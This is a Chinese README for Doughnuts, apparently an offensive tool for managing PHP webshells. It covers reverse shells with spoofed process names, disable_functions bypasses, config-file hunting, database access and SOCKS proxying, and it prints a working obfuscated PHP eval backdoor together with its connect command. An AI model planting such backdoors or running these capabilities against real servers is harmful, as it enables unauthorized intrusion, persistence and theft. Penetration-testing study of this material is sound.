# Doughnuts

*一个基于Python3.6+的PHPwebshell管理器*

![1](https://i.loli.net/2020/06/06/fYeQvPR8L4tjZ52.png)

![image-20200606123015596](https://i.loli.net/2020/06/06/3fSh6kg5PzbRLpY.png)

![3](https://i.loli.net/2020/06/06/I2yP1gUWeapMzvK.png)

![4](https://i.loli.net/2020/06/06/v4hEBUOXbuoy2jc.png)



## 特征

- 支持连接,记录,管理webshell,方便下一次连接
- 基于eval的连接,支持GET,POST,COOKIE,HEADER四种连接方式
- 支持编码payload(已内置base64,str_rot13,hex三种编码,可以通过添加encode文件夹中的py文件进行扩展),以实现连接带有解码的webshell
- 核心功能
    - 获取网站,系统信息
    - 获取一个临时的非完全交互式shell和webshell
    - 正向/反弹shell
    - (仅限双方均为*unix)获取完全交互式的反弹shell
    - 读/写/上传/下载/删除/搜索文件
    - 网站目录打包下载
    - 寻找可写的PHP文件(以树状结构显示)
    - 寻找配置文件(文件名中包含cfg/config/db/database) 也可以通过修改代码来支持寻找更多的文件(以树状结构显示)
    - 数据库管理
    - 输出disbale_functions
    - 端口扫描
    - 内网网页文本式浏览代理，可自定义请求方法和数据
    - 开启socks5服务器
- 易于扩展

## 依赖

- Python3.6+
- Python-requests
- Python-colorama
- Python-prettytable

## 安装方法

```
安装PYTHON 3.6+
git clone https://github.com/WAY29/Doughnuts.git
进入Doughnuts目录下
pip install -r requirements.txt 或 pip install requests colorma prettytable
python doughnuts.py
enjoy it!
```

## 使用例子

假如要连接以下的webshell:

```php
<?php
error_reporting(0);
eval(str_rot13(base64_decode($_REQUEST['2333'])));
?>
```

那么只需要运行Doughnuts.py,并输入以下命令:

```
connect http://localhost/test.php GET 2333 rot13 base64
```

即可成功连接至webshell

## 参考

灵感源自https://github.com/WangYihang/Webshell-Sniper

## 更新日志

### V2.7
- 一些细微的调整
- 修改核心逻辑
- 添加命令
    - bdf 尝试绕过disable_functions.目前只支持php7-backtrace这个模式
    - bobd 尝试利用ini_set与chdir绕过open_basedir.


### V2.6
- 修复bug
- 修改命令
    - shell 可以非交互运行一句系统命令
    - webshell 可以非交互运行一句webshell代码
- 添加命令
    - execute 调用notepad/vi运行一段自定义的php代码
    - getenv 获取php环境变量


### V2.5
- 新增依赖 prettytable
- 添加一系列数据库管理命令
    - db_init 初始化数据库连接
    - db_info 输出数据库信息
    - db_use 修改当前所在数据库
    - db_dbs 输出所有数据库信息
    - db_tables 输出某个数据库的所有表信息
    - db_columns 输出某个表的所有字段信息
    - db_shell 获得一个临时的sql shell


### V2.4
- 继续优化输入,现在支持历史命令补全,命令补全以及执行ls之后的文件(夹)名补全


### V2.3
- 尝试绕过disable_functions寻找可执行的系统命令函数
- 请求错误处理
- read命令更名为cat命令,别名为c
- 添加move(mv),chmod命令


### V2.2
- 重写输入，现在支持按下ctrl+c与ctrl+d
- 添加clear命令


### V2.1
- 修改windows环境下python反弹shell上传位置,并使其可以返回错误
- 修改帮助菜单为等宽
- 添加socks命令,用于在目标主机中开启socks5服务器


### V2.0

- 修复一个BUG曾导致无法连接php7的webshell
- 修复一个BUG曾导致help无法输出对应的帮助
- 修改help命令的别名为?,现在只输入?或help将输出帮助菜单
- 修改info输出的信息
- 修改各个函数的帮助信息,变得更加统一
- 重写fc与fwpf命令,重写树状输出
- 新增ls,bindshell(only for *unix)命令

### V1.9
- 添加search命令,使用glob函数递归搜索文件.命令格式为search {pattern}

### V1.8
- 优化连接时发送的请求,从发送三次变成发送2次
- 修改pdf命令的逻辑,在连接时获取
- 优化reshell命令,命令格式为reshell {lhost} {port} {type=[python|script|upload]{1|2|3},default = 0 (Python:1 Not Python:3)} {(Only for Mode 2) fakename=/usr/lib/systemd} 三种模式分别为:1->使用python pty模块升级, 2->使用linux自带的script命令升级, 3->上传一个反弹pty的二进制文件并运行(可以伪造进程名,若无法反弹请进入libs目录拿取源码,使用目标相同发行版进行编译后覆盖原reverse_server_light文件)


### V1.7

- 修改reshell命令,修复bug,优化体验,可以随意伪装进程名
- 在libs目录下放置reverse_server_light的源码,方便编译与修改(origin:https://github.com/QAX-A-Team/ptyshell)
- 重写portscan,支持三种扫描方式


### V1.6

- 修复了若干bug
- 添加了reshell命令,监听本地端口,并让目标反弹一个完整交互式的shell(仅限双方系统都是linux且可能存在一定的问题)


### V1.5

- modify指令现在会调用notepad/vim进行编辑
- write指令现在会调用notepad/vim进行编辑
- dump命令现在使用原始php代码进行压缩,可以压缩子目录
- 优化了发送payload的间隔符

### V1.4

- 添加指令:修改文件
- 关闭debug模式
- 修复了某些情况下fwpf,fc指令无法使用的情况,现在发送数据时会关闭错误提示


## 免责声明

本项目仅供网站管理人员与渗透测试人员学习与交流,任何使用本项目进行的一切未授权攻击行为与本人无关.

